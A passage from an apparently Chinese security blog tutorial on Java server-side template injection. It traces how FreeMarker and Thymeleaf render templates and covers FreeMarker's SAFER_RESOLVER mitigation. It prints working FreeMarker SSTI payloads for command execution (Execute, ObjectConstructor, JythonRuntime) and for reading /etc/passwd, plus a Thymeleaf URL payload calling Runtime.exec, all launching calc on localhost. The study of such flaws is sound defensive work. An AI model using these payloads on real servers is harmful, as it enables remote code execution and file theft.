<p>将locale拼接到文件名后，在与后缀拼接<code>index_zh_CN.ftl</code>，每次以最后一个<code>_</code>为截断进行截取，寻找模板，顺序为<code>index_zh_CN.ftl</code>，<code>index_zh.ftl</code>，<code>index.ftl</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774011353-44b58dac-06d8-4d33-b0c9-598b865cbdf6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774011353-44b58dac-06d8-4d33-b0c9-598b865cbdf6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><code>this.lookupWithAcquisitionStrategy</code>的主要任务是，判断是否存在这个模板并获取模板</p>
<p>跟进</p>
<p><code>this.lookupWithAcquisitionStrategy</code>，再跟进<code>lookupTemplateWithAcquisitionStrategy</code>，有一个<code>this.findTemplateSource(path)</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774493266-1d8853da-73d9-45a4-8522-f0f2f6d0fab0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774493266-1d8853da-73d9-45a4-8522-f0f2f6d0fab0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>层层跟进后，会将文件名和我们设置的模板目录进行拼接，并判断文件是否存在</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774581923-4244b14f-3ad5-4279-8322-1b4c4168eb85.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774581923-4244b14f-3ad5-4279-8322-1b4c4168eb85.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最后回到<code>getTemplate</code>方法中，这里<code>maybeTemp.getTemplate</code>方法，就从资源中获取到到了我们的模板内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774897991-135eb53d-8eb5-489b-93a3-2bf9d0823775.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774897991-135eb53d-8eb5-489b-93a3-2bf9d0823775.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接下来我们一步一步步出到<code>processHandlerException#render</code>方法中，走到<code>view.render</code>处，这里mv参数就可以看到我们所设置的参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753775479406-e9f9af81-294c-4bfe-a90a-59930d93eb3e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753775479406-e9f9af81-294c-4bfe-a90a-59930d93eb3e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>层层跟进到<code>FreeMarkerView#doRender</code>方法内</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753775740561-cb2eeeea-fa31-4ae6-9b1a-982b508933e0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753775740561-cb2eeeea-fa31-4ae6-9b1a-982b508933e0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后跟进<code>this.processTemplate</code>，继续层层跟入<code>template.process</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753775824428-f52bbadb-4b5f-43c2-8c24-caf133f5b61f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753775824428-f52bbadb-4b5f-43c2-8c24-caf133f5b61f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><code>prcess</code>方法 是做了一个输出HTML文件或其他文件的工作，相当于渲染的最后一步。在该方法中，会对ftl的文件进行遍历，读取一些信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753776026592-5dac9d93-eb5c-4ec5-a50e-96c04bf7d6ba.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753776026592-5dac9d93-eb5c-4ec5-a50e-96c04bf7d6ba.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在读取到每一条 freeMarker 表达式语句或插值的时候，会二次调用 <code>visit</code> 方法，而 <code>visit</code> 方法又调用了 <code>element.accept</code>，跟进</p>
<p>在读取到<code>$&#123;user.id&#125;</code>时，在accept方法中就可以获取到其对应的值了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753776491797-b1474b61-66d8-4d6c-bc4f-8994b6f4c856.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753776491797-b1474b61-66d8-4d6c-bc4f-8994b6f4c856.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在读取到<code>&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;</code>时，<code>accept</code>是这样的。</p>
<p>首先进行一系列的判断，判断<code>namespaceExp</code>是否为null，接着判断<code>this.operatorType</code>是否等于65536，后面我们跟进<code>eval</code>方法，在跟进<code>_eval</code>方法</p>
<p>在最后的<code>_eval</code>方法中，可以看到最后构造了一个<code>Execute</code>方法并返回</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1753777188629-a060b965-a3b4-448c-b6e2-e97a0e5a821a.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2025/png/44744277/1753777188629-a060b965-a3b4-448c-b6e2-e97a0e5a821a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753776739468-6759a50a-8038-48cd-8469-3cd869981cb8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753776739468-6759a50a-8038-48cd-8469-3cd869981cb8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778035470-4844fe57-0e3f-466e-aea2-b1a35cce7cb1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778035470-4844fe57-0e3f-466e-aea2-b1a35cce7cb1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>将构造好的<code>Execute</code>方法，与我们的参数<code>value</code>，一起put进去了<code>namespace</code>中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778205632-2765a2ed-dd0f-462f-86b9-35662810943b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778205632-2765a2ed-dd0f-462f-86b9-35662810943b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在读取到<code>$&#123;value(&quot;Calc&quot;)&#125;</code>中，根据以下调用栈进行跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">accept -&gt; calculateInterpolatedStringOrMarkup -&gt; eval -&gt; _eval</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778329137-5c807f0d-d1fe-45c4-98b9-b36769347b1b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778329137-5c807f0d-d1fe-45c4-98b9-b36769347b1b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最后走到<code>_eval</code>中，获取到之前添加进namespace中的<code>value: Execute@9528</code>，拿到了<code>Execute</code>方法，最后调用<code>Execute(&quot;Calc&quot;)</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778565581-61202614-6e16-4606-99a4-3624ae31840a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778565581-61202614-6e16-4606-99a4-3624ae31840a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最后走到<code>Execute#exec</code>中进行命令执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778769973-45e4941f-7813-42be-8716-229d3eaacfb5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778769973-45e4941f-7813-42be-8716-229d3eaacfb5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="pnsts">FreeMarker SSTI Bypass</h4>

<p>目前的Poc是这样的，前面除了new，还简单说了一下api方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;Calc&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>

<p>根据这些，我们可以构造出一些其他的poc进行bypass操作</p>
<h5 id="S2PeB">Poc1</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt; </span><br><span class="line">&lt;#assign clazz=classLoader.loadClass(<span class="string">&quot;ClassExposingGSON&quot;</span>)&gt; </span><br><span class="line">&lt;#assign field=clazz?api.getField(<span class="string">&quot;GSON&quot;</span>)&gt; </span><br><span class="line">&lt;#assign gson=field?api.get(<span class="literal">null</span>)&gt; </span><br><span class="line">&lt;#assign ex=gson?api.fromJson(<span class="string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>))&gt; </span><br><span class="line">$&#123;ex(<span class="string">&quot;Calc&quot;</span><span class="string">&quot;)&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="DR4vo">Poc2</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="string">&quot;Calc&quot;</span>).start()&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Tc6Sc">Poc3</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="keyword">new</span>()&gt;&lt;<span class="meta">@value</span>&gt;<span class="keyword">import</span> os;os.system(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="eSMeQ">Poc4</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign ex=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt; $&#123; ex(<span class="string">&quot;Calc&quot;</span>) &#125;</span><br></pre></td></tr></table></figure>

<h5 id="w8Dbx">Poc5(文件读取)</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign is=object?api.class.getResourceAsStream(<span class="string">&quot;/Test.class&quot;</span>)&gt;</span><br><span class="line">FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="keyword">if</span> <span class="type">byte</span> == -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">$&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign uri=object?api.class.getResource(<span class="string">&quot;/&quot;</span>).toURI()&gt;</span><br><span class="line">&lt;#assign input=uri?api.create(<span class="string">&quot;file:///etc/passwd&quot;</span>).toURL().openConnection()&gt;</span><br><span class="line">&lt;#assign is=input?api.getInputStream()&gt;</span><br><span class="line">FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="keyword">if</span> <span class="type">byte</span> == -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">$&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br></pre></td></tr></table></figure>

<h4 id="BCRk6">FreeMarker SSTI修复</h4>

<p>从 2.3.17版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：</p>
<ol>
<li>UNRESTRICTED_RESOLVER：可以通过 ClassUtil.forName(className) 获取任何类。</li>
<li>SAFER_RESOLVER：不能加载 freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor这三个类。</li>
<li>ALLOWS_NOTHING_RESOLVER：不能解析任何类。</li>
</ol>
<p>可通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法设置TemplateClassResolver，从而限制通过new()函数对<code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类的解析。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> freemarker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> freemarker.cache.StringTemplateLoader;</span><br><span class="line"><span class="keyword">import</span> freemarker.core.TemplateClassResolver;</span><br><span class="line"><span class="keyword">import</span> freemarker.template.Configuration;</span><br><span class="line"><span class="keyword">import</span> freemarker.template.Template;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStreamWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">freemarker_ssti</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置模板</span></span><br><span class="line">        HashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span><span class="string">&quot;&lt;#assign value=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123; value(\&quot;Calc\&quot;) &#125;&quot;</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        <span class="type">StringTemplateLoader</span> <span class="variable">stringLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTemplateLoader</span>();</span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        stringLoader.putTemplate(<span class="string">&quot;name&quot;</span>,poc);</span><br><span class="line">        cfg.setTemplateLoader(stringLoader);</span><br><span class="line">        <span class="comment">//cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);</span></span><br><span class="line">        <span class="comment">//处理解析模板</span></span><br><span class="line">        <span class="type">Template</span> <span class="variable">Template_name</span> <span class="operator">=</span> cfg.getTemplate(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">stringWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line"></span><br><span class="line">        Template_name.process(Template_name,stringWriter);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="nAcgD">Thymeleaf</h3>

<p>Thymeleaf 是一种用于 Web 和独立环境中的现代化服务器端 Java 模板引擎，它能够处理 HTML， XML，JavaScript，CSS 甚至纯文本。Thymeleaf 使用自然模板语法和预处理引擎，使得模板易于阅读， 修改和维护。Thymeleaf 是可扩展的，可以添加自定义标签和扩展函数，以实现自己的需求。</p>
<h4 id="jU0m6">Thymeleaf基础</h4>

<h5 id="UXyM6">Thymeleaf语法基础</h5>

<p>Thymeleaf表达式有以下类型</p>
<ul>
<li><code>$&#123;&#125;</code>：变量表达式——通常在实际应用中，一般是OGNL表达式或者SpEL表达式，如果集成了Spring，可以在上下文变量中执行</li>
<li><code>*&#123;&#125;</code>：选择表达式——类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行</li>
<li><code>#&#123;&#125;</code>：Message（i18n）表达式——允许从外部源（例如<code>.properties</code>文件检索特定于语言环境的消息）</li>
<li><code>@&#123;&#125;</code>：链接表达式——一般用在应用程序中设置正确的URL路径（URL重写）</li>
<li><code>~&#123;&#125;</code>：片段表达式——Thymeleaf 3.X 版本新增的内容，片段表达式是一种表示标记片段并将其移动到模板周围的简单方法。正式由于这些表达式，片段可以被赋值，或者作为参数传递给其他模板等等</li>
</ul>
<h5 id="klKXS">表达式预处理</h5>

<p>除了上述用于表达式处理的功能外，Thymeleaf还具有预处理表达式的能力。预处理是在处理正常表达式前完成的表达式的执行，允许修改最终将执行的表达式</p>
<p>预处理的表达式与普通表达式完全一样，但是被双下划线符号包围，例子如下：</p>
<p>首先变量表达式<code>$&#123;sel.code&#125;</code>先被执行，如果结果为<code>ALL</code>，那么<code>__</code>之间的值<code>ALL</code>将被当作表达式的一部分被执行，这里会变为<code>#&#123;selection.ALL&#125;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#&#123;selection.__$&#123;sel.code&#125;__&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ptZM2">Thymeleaf SSTI</h4>
Thymeleaf出现SSTI问题的主要原因是因为片段表达式，其本质为SPEL表达式注入。实际只有3.X版本的Thymeleaf才会收到影响，因为在2.X中`readerFragment`的核心处理方法为：

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">renderFragment</span><span class="params">(Set&lt;String&gt; markupSelectorsToRender, Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> viewTemplateEngine.getConfiguration();</span><br><span class="line">    <span class="type">ProcessingContext</span> <span class="variable">processingContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessingContext</span>(context);</span><br><span class="line">    templateCharacterEncoding = getStandardDialectPrefix(configuration);</span><br><span class="line">    <span class="type">StandardFragment</span> <span class="variable">fragment</span> <span class="operator">=</span> StandardFragmentProcessor.computeStandardFragmentSpec(configuration, processingContext, viewTemplateName, templateCharacterEncoding, <span class="string">&quot;fragment&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fragment == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid template name specification: &#x27;&quot;</span> + viewTemplateName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>里面并没有3.X版本中对于片段表达式<code>~&#123;&#125;</code>的处理，因此也不会造成SSTI漏洞</p>
<p>SpringBoot默认引用thymeleaf版本对应如下：</p>
<table>
<thead>
<tr>
<th align="center">Spring Boot</th>
<th align="center">Thymeleaf</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1.5.1.RELEASE</td>
<td align="center">2.1.5</td>
</tr>
<tr>
<td align="center">2.0.0.RELEASE</td>
<td align="center">3.0.9</td>
</tr>
<tr>
<td align="center">2.2.0.RELEASE</td>
<td align="center">3.0.11</td>
</tr>
</tbody></table>
<h5 id="K5Lmj">环境搭建</h5>

<p>这里的漏洞环境使用这个项目环境：<a href="https://github.com/veracode-research/spring-view-manipulation/">https://github.com/veracode-research/spring-view-manipulation/</a></p>
<p>以以下这个路径作为漏洞环境</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="os3QB">漏洞复现</h5>

<p>启动环境后，使用如下poc进行漏洞复现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8090/path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22Calc%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753804531798-238de504-bef6-4675-8f73-8eebab679d69.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753804531798-238de504-bef6-4675-8f73-8eebab679d69.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="EqNy6">漏洞分析</h5>

<p>对于Thymeleaf中SSTI的分析，主要是分析SpringMVC对于thymeleaf的解析流程</p>
<p>大致流程参照下图</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753804865985-cd261a80-40e6-4eb4-885b-4fbfa1e6f103.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753804865985-cd261a80-40e6-4eb4-885b-4fbfa1e6f103.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>DispatcherServlet#doService</code>下一个断点，因为<code>DispatcherServlet</code>时Spring对前端控制器的默认拦截器</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845218639-6408063e-e5fd-4760-bd36-1a4c4471e4fd.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845218639-6408063e-e5fd-4760-bd36-1a4c4471e4fd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h6 id="tIHLE">获取handler</h6>

<p>在<code>doService</code>方法中，前面会赋值一些属性，后面调用了<code>this.doDispath</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845432151-1ca056a4-9503-47fe-a881-66a0d0a831d8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845432151-1ca056a4-9503-47fe-a881-66a0d0a831d8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>this.doDispath</code>方法，这里的<code>this.getHanlder</code>会寻找我们访问路径所对应的Handler Mappings，再由Hanlder Mapping找到对应的Controller</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845561908-5902f69a-e10a-4075-acb1-af25ad7203f9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845561908-5902f69a-e10a-4075-acb1-af25ad7203f9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>this.getHanlder</code>，在Handler Mappings中存在五个Handler，通过迭代器进行遍历，目的是找到匹配的Handler</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845685605-d37d6ace-042b-4377-b2ea-7ad530d4ae46.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753845685605-d37d6ace-042b-4377-b2ea-7ad530d4ae46.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">再次跟进<code>getHanlder</code>，然后层层跟入<code>getHandlerInternal</code>方法以及父类的<code>getHandlerInternal</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753846004777-29eba5de-dc91-4e19-b034-a3ffe225b31c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753846004777-29eba5de-dc91-4e19-b034-a3ffe225b31c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>进入<code>lookupHandlerMethod</code>，首先根据传入的<code>lookupPath</code>进行匹配对应的路径，如果无法通过URI直接匹配，则对所有注册的RequestMapping进行匹配</p>
<p>无法通过URI匹配的情况主要有三种</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ①在RequestMapping中定义的是PathVariable，如/user/detail/&#123;id&#125;； </span><br><span class="line">// ②在RequestMapping中定义了问号表达式，如/user/?etail； </span><br><span class="line">// ③在RequestMapping中定义了*或**匹配，如/user/detail/** // No choice but to go through all mappings...</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753846671736-f74e8fec-eec9-4d00-84c3-87e316c1dead.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753846671736-f74e8fec-eec9-4d00-84c3-87e316c1dead.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h6 id="sj79C">获取Controller</h6>

<p>获取到匹配结果后，new了一个comparator，然后对匹配的结果进行排序，来获取相似度最高的（<code>get(0)</code>），如果存在两个匹配结果重合度一致时，就会抛出异常</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753846919416-87960c0b-730f-46ef-a643-6a9a6d2219fc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753846919416-87960c0b-730f-46ef-a643-6a9a6d2219fc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里可以看到，匹配到的时<code>GET /path</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847186339-5214d36a-b9b5-4d9c-aaf0-ba065e484733.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847186339-5214d36a-b9b5-4d9c-aaf0-ba065e484733.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>回到<code>DispatherServlet</code>中，向下跟，跟进<code>getHandlerAdpter</code>方法中，这个方法的目的是找到目标处理器的适配器</p>
<p>通过迭代器遍历<code>handlerAdapters</code>，判断该<code>adapter</code>是否支持该<code>handler</code>，如果支持则返回该<code>adapter</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847304592-f2ce25bd-5b17-4d58-8a41-23c947b3ced9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847304592-f2ce25bd-5b17-4d58-8a41-23c947b3ced9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847325623-12e7f47e-1c1f-4f67-b3c9-2e523d93c9ff.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847325623-12e7f47e-1c1f-4f67-b3c9-2e523d93c9ff.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h6 id="J44FC">获取ModelAndView</h6>

<p>再次回到<code>DispatherServlet</code>，调用了<code>ha.handle</code>，实现执行Controller中（Handler）的方法，并返回ModelAndView试图</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847678246-070bd8bf-684c-42ef-93ed-8a3ca61668fa.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847678246-070bd8bf-684c-42ef-93ed-8a3ca61668fa.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>handle</code>方法，继续跟进<code>this.handleInternal</code>，跟进至<code>this.invokeHandlerMethod</code>方法，就到了真正的业务方法</p>
<p>这里的<code>handlerMethod</code>其实就是<code>ThymeleafController#path(String)</code>，通过调用<code>this.createInvocableHandlerMethod</code>，将<code>handlerMethod</code>包装成一个<code>ServletInvocableHandlerMethod</code>类，让其具有invoke的执行能力</p>
